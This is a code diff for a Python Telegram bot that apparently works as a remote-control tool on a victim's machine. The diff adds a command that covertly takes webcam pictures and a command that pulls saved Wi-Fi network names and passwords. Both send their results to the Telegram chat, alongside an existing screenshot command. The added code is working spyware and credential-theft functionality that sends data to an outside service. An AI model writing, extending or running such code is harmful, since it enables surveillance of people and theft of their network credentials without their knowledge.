@@ -129,11 +129,26 @@ async def site(message):
 # Image commands
 @command_handler("screenshot", "⛶ Take a screenshot")
 async def take_screenshot(message_or_call):
-    screenshot = executer.pyautogui.screenshot()
+    screenshot = executer.snap_screenshot()
 
     reply_markup = InlineKeyboardMarkup([[FuncInlineKeyboardButton("Take another", take_screenshot)]])
     await bot.send_photo(message_or_call.chat.id if type(message_or_call) == Message else message_or_call.message.chat.id, executer.image_to_buffer(screenshot), "⛶ Screenshot", reply_markup=reply_markup)
 
+@command_handler("picture", "📸 Take a picture")
+async def take_picture(message_or_call):
+    picture = executer.snap_photo()
+
+    reply_markup = InlineKeyboardMarkup([[FuncInlineKeyboardButton("Take another", take_picture)]])
+    await bot.send_photo(message_or_call.chat.id if type(message_or_call) == Message else message_or_call.message.chat.id, executer.image_to_buffer(picture), "📸 Picture", reply_markup=reply_markup)
+
+
+# Other commands
+@command_handler("wifi", "🛜 Get saved wifi profiles")
+async def wifi(message: Message):
+    wifi_profiles = executer.WifiProfiler.get_wifi_profiles()
+
+    text = "🛜 Wifi profiles:\n\n" + "\n\n".join([f"ssid: {profile.ssid}\npass: {profile.password}" for profile in wifi_profiles])
+    await reply_to(message, text)
 
 # Media
 get_medium_by_name_or_id = lambda name_or_id, media_type: data.get_medium_by_id(name_or_id) if (type(name_or_id) == int) or name_or_id.isdigit() else data.get_medium(name_or_id, media_type)
@@ -294,7 +309,7 @@ async def file_handler(message: Message, file: File | None = None):
 set_file_handler(file_handler)
 
 # GTE
-@command_handler("gte_handler", show=False)
+@command_handler("gte_handler", show=False, supports_message_args=False)
 async def GTE_handler(message_or_call: Message | CallbackQuery, gte_file_name: str, cmd: str = "show"):
     code = executer.GTEFiles.load(gte_file_name)
 
@@ -373,7 +388,8 @@ async def GTE(message_or_call: Message | CallbackQuery, gte_file_name: str | Non
     else:
         code = executer.GTEFiles.load(gte_file_name)
 
-    await GTE_handler(message_or_call, gte_file_name, "show")
+    print(gte_file_name)
+    await GTE_handler(message_or_call, gte_file_name or "latest", "show")
 
 run()
 
